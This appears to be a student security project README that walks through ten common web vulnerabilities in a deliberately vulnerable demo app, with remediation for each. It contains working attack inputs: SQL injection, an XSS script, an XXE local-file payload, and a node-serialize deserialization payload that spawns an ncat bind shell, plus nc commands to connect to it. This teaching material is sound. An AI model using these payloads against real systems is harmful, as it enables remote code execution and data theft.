# CS467: Website Security Research Project

This project will explore the web vulnerabilities outlined in the article <a href="https://www.vpnmentor.com/blog/top-10-common-web-attacks/">Top 10 Common Web Attacks: The First Steps to Protect Your Website</a>. These vulnerabilities are categorized as follows:

* [Injection](#1-injection)
* [Broken Authentication](#2-broken-authentication)
* [Sensitive Data Exposure](#3-sensitive-data-exposure)
* [XML External Entities](#4-xml-external-entities)
* [Broken Access Control](#5-broken-access-control)
* [Security Misconfiguration](#6-security-misconfiguration)
* [Cross-Site Scripting](#7-cross-site-scripting)
* [Insecure Deserialization](#8-insecure-deserialization)
* [Using Components with Known Vulnerabilities](#9-using-components-with-known-vulnerabilities)
* [Insufficient Logging & Monitoring](#10-insufficient-logging--monitoring)

These vulnerabilities will be explored through a demonstration app, datapotato:
<img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/datapotato_black_outlines.svg#gh-light-mode-only" width=50% height=50%>
<img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/datapotato_white_outlines.svg#gh-dark-mode-only" width=50% height=50%>

The code provided in this repo intentionally redacts the credentials in the <code>dbcon.js</code> file required to connect to the SQL database.

# 1. Injection 
<details>
  <summary>
    Details
  </summary>
  
### Description

  |Source|Definition|
  |---|---|
  |Wikipedia|**Code injection** is the exploitation of a computer bug that is caused by processing invalid data|
  |OWASP|**Injection** is an attacker’s attempt to send data to an application in a way that will change the meaning of commands being sent to an interpreter|
  |IBM|This type of attack allows an attacker to **inject code** into a program or query or inject malware onto a computer in order to execute remote commands that can read or modify a database, or change data on a web site|
  
  These definitions are intentionally broad, as this concept appears in many environments. Our sources above list multiple subcategories of injection vulnerabilities:
  
  * Wikipedia: SQL injection, Cross-site scripting, Dynamic evaluation vulnerabilities, Object injection, Remote file injection, Format specifier injection, Shell injection
  * OWASP: SQL queries, LDAP queries, Operating system command interpreters, Any program invocation, XML documents, HTML documents, JSON structures, HTTP headers, File paths, URLs, A variety of expression languages
  * IBM: Blind SQL Injection, Blind XPath Injection, Buffer Overflow, Format String Attack, LDAP Injection, OS Commanding, SQL Injection, SSI Injection, XPath Injection
  
  ---
  
### Demonstration
  We'll focus on a specific flavor of injection vulnerability, SQLi (SQL injection).
  
  In this example, users are able to submit a request for data, for any individual user:
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/enterUserName1.PNG">
  
  This sends the following request to our SQL table:
  
  ```
  SELECT userName, userData FROM `Users` WHERE userName='user1'
  ```
  
  Result:
  
  |userName|userData|
  |---|---|
  |user1|user1's data|
  
  Now, let's inject a logical statement that our developers probably didn't intend to be used.  
  (This statement closes an open string, adds a logical OR, and comments out the rest of the SQL request body):
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/enterUserName2.PNG">
  
  ```
  SELECT userName, userData FROM `Users` WHERE userName='user1' or TRUE
  ```
  
  This returns all rows in our table, because TRUE always evaluates to TRUE:
  
  |userName|userData|
  |---|---|
  |user1|user1's data|
  |user2|user2's data|
  |user3|user3's data|
  |[...]|[...]|
  
  You can try a live demo of this here (requires connection to OSU VPN):
  <a href="http://flip3.engr.oregonstate.edu:37773/injection#demonstration">[LINK TO WEB APP]</a>
  
  In this example, we've allowed the user to execute arbitrary SQL queries on our database. Our data is no longer secure or reliable. 
 
  ---  

### Remediation
  
  Remediation for injection vulnerabilities are specific to the context of the application. We will provide recommendations for the specific example above.
  
  OWASP advises vulnerabilities like the SQLi example above are failures of the **injection context**, specifically the SQL query. OWASP recommends the first defense in this context is escaping, in which we ensure data is treated like data, rather than an extension of the functionality or logic the query.
  
  MariaDB provides a method to bind data values to our query at the time it is executed, preventing the injection of additional commands.
  
  We'll convert our SQL query to a paramaterized query:
  
  ```
  SELECT userName, userData FROM `Users` WHERE userName=?
  ```
  
  This time, if you didn't enter a valid userName, you won't retrieve any results, since "user1' or TRUE; #" is not a valid user. This query is hardened against arbitrary SQL commands entered by our users.
 
  ---
  
### Citations: Injection
  "Code injection." Wikipedia.  
  https://en.wikipedia.org/wiki/Code_injection (accessed Jan 29, 2022).
  
  J. Williams. "Injection Theory". OWASP.  
  https://owasp.org/www-community/Injection_Theory (accessed Jan 29, 2022).
  
  "Injection Attacks." IBM.  
  https://www.ibm.com/docs/en/snips/4.6.0?topic=categories-injection-attacks (accessed Jan 29, 2022).
  
  "PREPARE Statement". MariaDB.  
  https://mariadb.com/kb/en/prepare-statement/ (accessed Feb 10, 2022)
</details>

# 2. Broken Authentication
<details>
  <summary>
    Details
  </summary>
  
### Description
  |Source|Definition|
  |---|---|
  |OWASP|(now referred to as Identification and Authentication Failures) Confirmation of the user's identity, authentication, and session management is critical to protect against **authentication-related attacks**|
  |IBM| This type of attack targets and attempts to **exploit the authentication process** a web site uses to verify the identity of a user, service, or application|
  
  This is another broad category. There are many types of authentication in use. IBM divides these attacks into 3 categories:
  * Brute force
  * Insufficient authentication
  * Weak password recovery
  
  Our app won't implement a password recovery system, so we'll focus on the other two attacks.
  
  ---
  
### Demonstration
  The most basic attack in this category is brute force, either guessing credentials or using an automated process to gain access to restricted systems or data.
  
  We've set up an `/admin` route that allows direct read accesss for our web app's data. To access this route, you'll need to know the admin username an password.
  
  To make it easy, we'll pick one of the [OWASP Top 10000 Worst Passwords](https://github.com/OWASP/passfault/blob/master/wordlists/wordlists/10k-worst-passwords.txt). Can you guess which one it is?
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/admin.PNG">
  
  If you brute-forced this answer and visit the [ADMIN page](http://flip3.engr.oregonstate.edu:37773/admin) (requires connection to OSU VPN), you'll see all our user data.
  
  ---
  
### Remediation
  
  There are multiple ways we can harden our app against this vulnerability.
  
  First, we'll change the password to something harder to guess. Because password strength recommendations vary widely, we'll combine recommendations from a few sources:
  
  |Source|Recommendation|
  |---|---|
  |[OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)|Minimum length of the passwords should be enforced by the application. Passwords shorter than 8 characters are considered to be weak
  |[OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)|Maximum password length should not be set too low, as it will prevent users from creating passphrases. A common maximum length is 64 characters [...] It is important to set a maximum password length to prevent long password Denial of Service attacks.|
  |[IBM Password Guidelines](https://www.ibm.com/docs/en/partnerengagemanager?topic=overview-password-guidelines)|A length of 15-50 characters|
  |[IBM Password Guidelines](https://www.ibm.com/docs/en/partnerengagemanager?topic=overview-password-guidelines)|A combination of at least two-character types from the following options: uppercase[A-Z], lowercase[a-z], number[0-9], and special characters. The valid non-alphabetic characters include the following characters hyphen (-), underscore (_), period (.), and special characters such as !@#$%&|
  
  We'll also use a password strength meter application like [zxcvbn](https://github.com/dropbox/zxcvbn) to ensure the password we pick is safe against brute force attacks. (See also: [interactive web implementation of zxcvbn](https://lowe.github.io/tryzxcvbn/))
  
  Now that we've got our strong password, we'll salt it and hash it using the [Crypto nodejs module](https://nodejs.org/api/crypto.html) before saving it in our database. This fixes two more vulnerabilities:
  
  Salting: This is a randomized string concatenated with the password before hashing, to ensure that if the hashing mechanism is compromised, an attacker can't automatically solve for all the other passwords in the database.
  
  Hashing: This increases the complexity of the plaintext password before saving it to our database, ensuring someone with access to the database can't read the plaintext version of the password.
  
  These changes are impemented for our users in the hardened web app.
  
  ---
  
### Citations: Broken Authentication
  "A07:2021 – Identification and Authentication Failures". OWASP top 10:2021.  
  https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/ (accessed Feb 10, 2022).
  
  "Authentication attacks". IBM.  
  https://www.ibm.com/docs/en/snips/4.6.0?topic=categories-authentication-attacks (accessed Feb 10, 2022).
  
  D. Whitelegg. "Scan your app to find and fix OWASP Top 10 - 2017 vulnerabilities". IBM Developer.  
  https://developer.ibm.com/tutorials/se-owasp-top10/ (accessed Feb 10, 2022).
  
  "10k-worst-passwords.txt". OWASP / passfault.  
  https://github.com/OWASP/passfault/blob/master/wordlists/wordlists/10k-worst-passwords.txt (accessed Feb 10, 2022).

  "Authentication Cheat Sheet". OWASP Cheat Sheet Series.  
  https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html (accessed Feb 12, 2022).
  
  "Password guidelines". Search in IBM Sterling Partner Engagement Manager.  
  https://www.ibm.com/docs/en/partnerengagemanager?topic=overview-password-guidelines (accessed Feb 12, 2022).
  
  "zxcvbn". dropbox / zxcvbn.  
  https://github.com/dropbox/zxcvbn (accessed Feb 12, 2022).
  
  "demo". zxcvbn tests.  
  https://lowe.github.io/tryzxcvbn/ (accessed Feb 12, 2022).
  
  "Crypto". Crypto | Node.js.  
  https://nodejs.org/api/crypto.html (accessed Feb 12, 2022).

  "How to use the crypto module". Node.js.  
  https://nodejs.org/en/knowledge/cryptography/how-to-use-crypto-module/ (accessed Feb 13, 2022).
 </details>
  
# 3. Sensitive Data Exposure
<details>
  <summary>
    Details
  </summary>
  
### Description
  |Source|Definition|
  |---|---|
  |OWASP|(See "Cryptographic Failures")[...] the focus is on **failures related to cryptography** (or lack thereof) [...] (which) often lead to exposure of sensitive data"
  |vpnMentor|Secret data usually needs to be **protected with encryption** and other cryptographic algorithms|
  
  ---
  
### Demonstration
  
  Any endpoint that can access our user data will be able to see the userData column in plaintext. (Users on the OSU VPN can use the exploit in the [Broken Authentication](#2-broken-authentication) section to access this data.) 
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/userData.PNG">
  
  ---
  
### Remediation
  
  The most direct route for us to fix this is to encrypt our users' data.
  
  Fortunately, the <code>crypto</code> nodejs module we're using to salt and hash our user passwords also includes <code>cipher</code> and <code>decipher</code> classes we can use to encrypt this part of our database.
  
  (OSU VPN users only) This utility is live on the [/admin route](http://flip3.engr.oregonstate.edu:37773/admin) and you can see a snapshot of the web app utility here.
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/encrypt1of3.png">
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/encrypt2of3.png">
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/encrypt3of3.png">
  
  ---
  
### Citations: Sensitive Data Exposure
  
  "A02:2021 – Cryptographic Failures". OWASP Top 10:2021.  
  https://owasp.org/Top10/A02_2021-Cryptographic_Failures/ (accessed Feb 13, 2022).
  
  Avi. D. "Top 10 Common Web Attacks: The First Steps to Protect Your Website." vpnMentor.  
  https://www.vpnmentor.com/blog/top-10-common-web-attacks/ (accessed Feb 13, 2022).
  
  "Crypto". Crypto | Node.js.  
  https://nodejs.org/api/crypto.html#class-cipher (accessed Feb 16, 2022).
  
</details>

# 4. XML External Entities
<details>
  <summary>
    Details
  </summary>
  
### Description
  
  |Source|Definition|
  |---|---|
  |OWASP|An **XML External Entity attack** is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.|
  |IBM| [Vulnerable software] could allow a remote attacker to obtain sensitive information, caused by an **XML External Entity Injection** (XXE) error when processing XML data. An attacker could declare an entity referencing the content of a local file to obtain sensitive information.|
  
  A basic XML file with a defined entity looks like this:
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY bar "This is a fine entity">]>
  <foo>&bar</foo>
  ```
  
  Here's how Firefox and Chrome render this XML:
  
  Firefox:
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/fooFirefox.PNG">
  
  Chrome:
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/fooChrome.PNG">
    
  ---
  
### Demonstration
  
  The issue at hand is that the [document type declaration](https://www.w3.org/TR/REC-xml/#sec-prolog-dtd) can be configured to access internal or external references.
  
  External entities, such as ones that point to server resources, or malicious URLs, are our primary concern. Here is an example of a potentially harmful XML request (from the [OWASP website](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing).) This request could send an attacker information about critical system files:
  
  ```
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
  <foo>&xxe;</foo>
  ```
  
  Because many modern node libraries do not support expansion of external entities, your researchers were not able to find a library which sufficiently demonstrated this vulnerability compatible with our node setup. In lieu of a live demonstration, please consider the following well-documented examples:
  
  [XML Entity Expansion in NodeJS](https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_nodejs.html)  
  [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)  
  
  ---
  
### Remediation
  
  Developers should consider all of their XML parsing dependencies carefully, and ensure any custom XML parsing implementations have external entity expansion off by default. 
  
  Popular npm XML parsing utilities such as [express-xml-bodyparser](https://www.npmjs.com/package/express-xml-bodyparser) will automatically prevent entities from being defined, by throwing an error if an unescaped ampersand is encountered. Here's what happens when we send an XML POST to our endpoint with an ampersand using this package:
  
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY bar "This is a fine entity">]>
  <foo>&bar;</foo>
  ```
  Returns <code>Error: Invalid character entity</code>
  
  In our hardened web app, we'll return a <code>400 BAD REQUEST</code> error if we receive a request of this type. This will limit the types of XML requests we can process, but it will ensure protection against this vulnerability. Try using an API like [Postman](https://www.postman.com/) to send your own XML request to the server.
  
  ---
  
### Citations: XML External Entities
  "XML External Entity (XXE) Processing". OWASP.  
  https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing (accessed Feb 20, 2022).
  
  "IT06733: A vulnerability in XML External Entity (XXE) processing could allow a remote attacker to obtain sensitive information.". IBM Support.  
  https://www.ibm.com/support/pages/apar/IT06733 (accessed Feb 20, 2022).
  
  "XML introduction". MDN Web Docs.  
  https://developer.mozilla.org/en-US/docs/Web/XML/XML_introduction (accessed Feb 20, 2022).
  
  "Load external DTDs (entity/entities) (local and remote) if a pref is set". Bugzilla.  
  https://bugzilla.mozilla.org/show_bug.cgi?id=22942 (accessed Feb 20, 2022).
  
  "express-xml-bodyparser". npmjs.com.  
  https://www.npmjs.com/package/express-xml-bodyparser (accessed Feb 20, 2022).
  
  "Prolog and Document Type Declaration". w3.org.  
  https://www.w3.org/TR/REC-xml/#sec-prolog-dtd (accessed Feb 20, 2022).
  
  "Postman API Platform". Postman.  
  https://www.postman.com/ (accessed Feb 20, 2022).
  
  "XML Entity Expansion in NodeJS". SecureFlag.  
  https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_nodejs.html (accessed Feb 23, 2022).
  
  "XML External Entity Prevention Cheat Sheet". OWASP Cheat Sheet Series.  
  https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html (accessed Feb 23, 2022).
  
</details>

# 5. Broken Access Control
<details>
  <summary>
    Details
  </summary>
  
### Description
  
  |Source|Definition|
  |---|---|
  |Wikipedia|In the fields of physical security and information security, **access control** (AC) is the selective restriction of access to a place or other resource|
  |OWASP|**Access control** enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits|
  |IBM|**Access control** mechanisms determine which operations the user can or cannot do by comparing the user's identity to an access control list (ACL)|
  
  In our first 5 vulnerabilities, this category affects the most code. Every piece of data, endpoint, and access mechanism should be considered with respect to this topic.
  
  OWASP goes on to provide a [broad list of vulnerabilities](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) in this category:
  
  * Violation of the principle of least privilege or deny by default, where access should only be granted for particular capabilities, roles, or users, but is available to anyone.  
  * Bypassing access control checks by modifying the URL (parameter tampering or force browsing), internal application state, or the HTML page, or by using an attack tool modifying API requests.  
  * Permitting viewing or editing someone else's account, by providing its unique identifier (insecure direct object references)  
  * Accessing API with missing access controls for POST, PUT and DELETE.  
  * Elevation of privilege. Acting as a user without being logged in or acting as an admin when logged in as a user.  
  * Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token, or a cookie or hidden field manipulated to elevate privileges or abusing JWT invalidation.  
  * CORS misconfiguration allows API access from unauthorized/untrusted origins.  
  * Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.  

  ---
  
### Demonstration
  
  Our app is currently vulnerable to two of the access control failures above: bypassing access control checks by modifying the URL and accessing the API with missing access controls.
  
  During development, we created a route (OSU VPN users only) [/adminTest](http://flip3.engr.oregonstate.edu:37773/adminTest) to test admin functionality. This page was created before we implemented Session authentication. However, we forgot to remove this route or remediate the access control on this page. Even though there is no link to this page on our site, if someone discovered this route they'd be able to access many of our admin utilities normally protected with userName/password authentication.
  
  The other access control failure can be demonstrated with any utility that can send an HTTP request. Here, we'll use [Postman](https://www.postman.com/). 
  
  Our web app will process any valid HTTP request sent to it without requiring authentication. Let's POST to [/admin](http://flip3.engr.oregonstate.edu:37773/admin) and use the admin utility to reset the database: 
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/postToAdmin.png">
  
  We were able to do this because there's no access control on that route. All of our custom user data has been lost!  
  
  ---
  
### Remediation
  
  In our hardened app, we'll make to two changes to remediate these failures:
  
  1. The <code>/adminTest</code> route will be removed
  2. All reqest types sent to the <code>/admin</code> route will require the same Session authentication confirming the user that is signed in has admin credentials.
  
  Additional remediations we could take include:
  * Using more advanced authentication such as JWTs
  * Enforcing "least privilege" principles where certain utilities are only available to specific user groups
  * Increased logging
  * Disabling directory browsing
  
  ---
  
### Citations: Broken Access Control
  "A01:2021 – Broken Access Control". OWASP Top 10:2021.  
  https://owasp.org/Top10/A01_2021-Broken_Access_Control/ (accessed Feb 21, 2022).
  
  "Authentication versus access control". IBM Watson Content Analytics.  
  https://www.ibm.com/docs/en/wca/3.0.0?topic=security-authentication-versus-access-control (accessed Feb 21, 2022).
  
  "Access Control". Wikipedia.  
  https://en.wikipedia.org/wiki/Access_control (accessed Feb 21, 2022).
  
  "Postman API Platform". Postman.  
  https://www.postman.com/ (accessed Feb 21, 2022).
  
</details>

# 6. Security Misconfiguration
<details>
  <summary>
    Details
  </summary>
  
### Description
  |Source|Definition|
  |---|---|
  |OWASP|**Security Misconfiguration** can happen at any level of an application stack, including the network services, platform, web server, application server, database, frameworks, custom code, and pre-installed virtual machines, containers, or storage.|
  |The Hackerish|**Security Misconfiguration** happens when the responsible party fails to follow best practices when configuring an asset.  This asset can be an operating system, a web server, software running on a machine, etc. Security Misonfigurations don't affect web assets only.  Any component which requires a configuration is subject to this vulnerability.  This means network devices, hardware, email services, etc. can suffer from this vulnerability.|
  |Guardiacore|**Security Misonfiguration** is simply defined as failing to implement security controls for a server or web application, or implementing the security controls, but doing so with error.|
  
  ---
### Demonstration
  From the definitions, it is clear that **Security Misoncfiguration** affects more than just the web application, which in our case is the nodejs application, the libraries we are using, and our database.
  
  For the purposes of this demonstration, we'll focus on the Server itself, which in this case if the Oregon State flip3 server where our vulnerable web application is hosted.  More specificically we'll look at configuration of the ports and protocols.
  
  One of the tenets of good network security is to only open network ports that are necessary. However, because of the nature of the flip3 server, it is required to be fairly open, otherwise it would not be possible to host student web applications - including ours.
  
  To put in perspective how open the flip3 server is, I conducted an nmap scan:
  
  <img src="https://github.com/howed-neighbor/CS467/blob/main/public/images/flip3_nmap_scan1.png" alt="flip_scan1" height="50%" width="100%">
  <img src="https://github.com/howed-neighbor/CS467/blob/main/public/images/flip3_nmap_scan2.png" height="50%" width="100%">
  
  The simple nmap scan can provide an attacker a wealth of information, but more importantly, each open port/protocal provides an attacker a potential attack vector against the system or application.
  
  ---
### Remediation
  For obvious reasons, we do not have the privileges necessary to harden the flip3 server, however, we do have those privileges on our AWS instance.
  
  In our AWS instance we can control which ports/protocols are exposed through the use of **Security Groups** and **Network ACLs**.  For our purposes, we'll only use the Security Group.
  
  Each EC2 instance in our AWS Virtual Private Cloud (VPC) must have a security group associated with it.  A security group acts a firewall.  We can define a range of source IPs from the Internet that communicate with our EC2 instance, and we can define the ports on our EC2 instance that can be reached.
  
  We created the following rule:
  <img src="https://github.com/howed-neighbor/CS467/blob/main/public/images/aws_security_group.png" width="100%">
  
  This only exposes the TCP port 37773 to anyone on the Internet (0.0.0.0), significantly reducing the attack surface area of our system/application.
  
  Screenshot of an nmap scan before the security group was modified in AWS:
  <img src="https://github.com/howed-neighbor/CS467/blob/main/public/images/aws_scan_before.png" width="100%">
  
  Screenshot of an nmap scan after the security group was modified in AWS:
  <img src="https://github.com/howed-neighbor/CS467/blob/main/public/images/aws_scan_after.png" width="100%">
  
  As we can see, the information a potential attacker is able to obtain is limited, but more importantly our attack surface area is greatly reduced.
  
  ---
### Citations: Security Misconfiguration
  "Security Misconfiguration". OWASP.  
  https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration (accessed Feb 22, 2022).
  
  "Security Misconfiguration Explained". The Hackerish.  
  https://thehackerish.com/owasp-security-misconfiguration-explained/ (accessed Feb 19, 2022).
  
  "What is Security Configuration and How to Avoid It" Guardiacore.  
  https://www.guardicore.com/blog/understanding-and-avoiding-security-misconfiguration/ (accessed Feb 19, 2022).
</details>

# 7. Cross-Site Scripting
<details>
  <summary>
    Details
  </summary>
  
### Description
  
  |Source|Definition|
  |---|---|
  |Wikipedia|**XSS** is a type of security vulnerability that can be found in some web application. XSS attacks enable attackers to inject **client-side scripts** into web pages viewed by other users.|
  |OWASP|**XSS** attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.|
  |IBM<|**XSS** is a computer security vulnerability that allows malicious attackers to inject client-side script into web pages viewed by other users.|

  In summary, XSS is an attack on vulnerable web applications that allows a malicious actor to inject client-side script, e.g. javascript, into web pages.
                
  ---
### Demonstration
  In this first example, we will start off with benign input. Here's what users of the web app will see when they type **Hello World!** and select "Submit" in this example.
    
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/xssHelloWorld.png">
    
  This posts the following to our web application, which is then rendered by our express handlebars templating engine.

  ```
  req.body.userInput
  ```
    
  Result:
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/xssDemonstrationResult.png">
    
  Now we'll inject a script into the web app, something the developers probably didn't intend to be used.
    
  Here's what users of the app will see when they type **&lt;script&gt;alert(42)&lt;/script&gt;** and select "Submit".
                
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/xssScript.png">
  
  Result:
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/xssScriptResult.png">
  
  In this example, we've allowed the user to inject a client-side script into our web application.
  
  ---
### Remediation
  There many methods to remediate XSS vulnerabilities. Most techniques revolve around sanitizing user input.
        
  Our web application is succeptible to XSS because the handlebars engine renders user provided input exactly as written.

  Specifically, the vulnerable piece of code in our handlebars template is:

  ```
  {{{input}}}
  ```

  Use of the triple brackets will render all user input exactly as written.

  We can prevent script injection by using double brackets as so:

  ```
  {{input}}
  ```

  Users can again attempt to inject the XSS script again into our web application:

  **&lt;script&gt;alert(42)&lt;/script&gt;** and select "Submit".
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/xssRemediation.png">
  
  Use of double brackets in handlebars escapes special characters such as '&lt;' and '&gt;', which are often used in XSS attacks.
  
  ---
### Citations: Cross-Site Scripting
  "Code injection." Wikipedia.  
  https://en.wikipedia.org/wiki/Cross-site_scripting (accessed Feb 14, 2022).  
  
  KirstenS. "Cross Site Scripting (XSS)". OWASP.  
  https://owasp.org/www-community/attacks/xss/ (accessed Jan 29, 2022).  
  
  "Cross Site Scripting (XSS) Filter." IBM.  
  https://www.ibm.com/docs/en/sc-and-ds/8.2.0?topic=manager-cross-site-scripting-xss-filters (accessed Feb 15, 2022).  
  
  "Expressions." Handlebars Online User Guide.  
  https://handlebarsjs.com/guide/expressions.html (accessed Feb 10, 2022).
  
</details>

# 8. Insecure Deserialization
<details>
  <summary>
    Details
  </summary>
  
### Description
  In order to understand what **Insecure Deserialization** is, we must first define **serialization.**
  
  Wikipedia defines **serialization** as the process of translating a data structure or object state into a format that can be stored (e.g. in a file or memory buffer) or transmitted (e.g. over a network) and reconstructed later (possibly in a different computer envrinoment). When the resulting series of bits is re-read according to the serialization format, it can be used to create a semantically identical clone of the original object.
  
  |Source|Definition|
  |---|---|
  |Search Security|**Inseucre Deserialization** is a vulnerability in which an untrusted or unknown data is used to either inflict a DoS, execute code, bypass authentication or further abuse logic behind the application. **Serialization** is the proces that converts an object to a format that can be later restored. **Deserialization** is the opposing process which takes data from a file, stream or network and rebuilds it into an object.|
  |Portswigger|**Insecure Deserialization** is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized object in order to pass harmful data into the application code.|
  
  ---
### Demonstration
  Our web application makes use of the node package **"node-serialize"** to serialize and deserialize objects.
  
  In this first example, we will start off with benign input. We will serialize a simple JSON object and then deserialize it. Type:
  
  ```
  {test:123}
  ```
  
  and select "Submit". Here's what that looks like in our [web app (OSU VPN users only)](http://flip3.engr.oregonstate.edu:37773/insecureDeserialization):
  
  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/insecureDeserialization1.PNG">
  
  We'll now deserialize the serialized object, which should return the original input <code>{test:123}</code>. Here's the result from our web app.

  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/insecureDeserialization2.PNG">
  
  We'll now utlize a more nefarious input which will allow us to create a BIND Shell on our server. In the web app, type in the following:
  
  ```
  {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}
  ```
  
  In a command line terminal, preferably linux, connect to the bind shell.
  
  If visiting the web application on our AWS instance:
  
  ```
  nc -vn 157.175.92.30 4444
  ```
  
  If visiting the web application on the flip server:
  ```
  nc -vn 127.0.0.1 4444
  ```
  
  The vulnerable piece of code in our web application is:
  
  ```
  var serialze = require('node-serialize')
  var obj = req.body.userInput
  var deserialized = serialize.unserialize(obj)
  ```
  
  We are deserializing unsanitized user input.
  
  The issue lies in the fact that the node-serialize package allows for the serialization and deserialization of JSON objects which have functions defined.
  
  In nefarious payload, we created a JSON object with the key **"rce"** which had function definend as its value.
  
  According to [Aleski Turin](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/), a serialized object with a function defined has the following form:
  
  ```
  {"anything_here":"_$$ND_FUNC$$_function (){сonsole.log(1)}"}
  ```
  
  Anything after the special tag <code>$$ND_FUNC$$</code> is evaluated in the eval function.  This is what allows malicious users to execute arbitrary code on our web application.
  
  ---
### Remediation
  We can mitigate/prevent this vulnerability from being exploited by sanitizing user input.
  
  In our sanitized code, we make use of the <code>JSON.stringify</code> function:
  
  ```
  var serialze = require('node-serialize')
  var obj = req.body.userInput
  var sanitized = JSON.stringify(obj)
  var deserialized = serialize.unserialize(sanitized)
  ```
  
  If we attempt to enter the malicious code again, and try to connect to the BIND shell, it will fail.
  
  If you enter the following code again in our sanitized form, here's what you'll see:
  
  ><img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/insecureDeserialization3.PNG">
  
  Our web application can now safely deserialize the user input:
  
  ```
  {test:123}
  ```
  
  If you attempt to connect to the BIND shell, it no longer works. Try it:
  
  If visiting the web application on our AWS instance:
  
  ```
  nc -vn 157.175.92.30 4444
  ```
  
  If visiting the web application on the flip server:
  
  ```
  nc -vn 127.0.0.1 4444
  ```
  
  ---
### Citations: Insecure Deserialization
  "Deserialization vulnerabilities: attacking deserialization in JS" Acunetix.  
  https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/ (accessed Feb 20, 2022).
  
  "Exploiting Node.js deserialization bug for Remote Code Execution". OPSECX.  
  https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ (accessed Jan 29, 2022).
  
  "Serialization" Wikipedia.  
  https://en.wikipedia.org/wiki/Serialization (accessed Feb 15, 2022).
  
  "What is Insecure Deserialization." Acunetix.  
  https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/ (accessed Feb 10, 2022).
</details>

# 9. Using Components with Known Vulnerabilities
<details>
  <summary>
    Details
  </summary>
  
### Description
  |Source|Definition|
  |---|---|
  |Team Treehouse|**Components** such as libraries, frameworks, and other software modules, run with same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover.  Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts|
  |GeeksforGeeks|**Components with known vulnerabilities** can be defined as third-party apps or software platforms that are outdated and contain bugs that are public to all, i.e. sites like <a href="https://www.exploit-db.com">exploit-db</a> contain the full details as to how to exploit the bugs to put the security of the whole website under severe threat.|
  |WhiteSource|**Components with known vulnerabilities** contain vulnerabilities that were discovered in open source components and published in the NVD, security advisories or issue trackers.  From the moment of publication, a vulnerability can be exploited by hacker who find the documentation.|
  
  As developers, we often solely focus on functionality of the software we are writing, very rarely do we think about security.  We'll often incorporate libraries that help us get our job done, but we don't do our due diligence in researching possible vulnerabilities associated with those libraries.  The security often gets overlooked.
  
  ---
### Demonstration
  Our Web Application makes use of the node package **"node-serialize"** to serialize and deserialize objects. The **"node-serialize"** library has a CVE (Common Vulnerability and Exposure) associated with it.
  
  <a href="https://www.cvedetails.com/cve/CVE-2017-5941/">CVE-2017-5941</a> contains a description and links to proof of concept exploit code for the node-serialize library.
  
  For an in-depth demonstration on how to exploit a component with a known vulnerability, please refer to our Insecure Deserialization section, where you'll be taken through a step-by-step guide on how to exploit the **"node-serialize"** library.
  
  ---
### Remediation
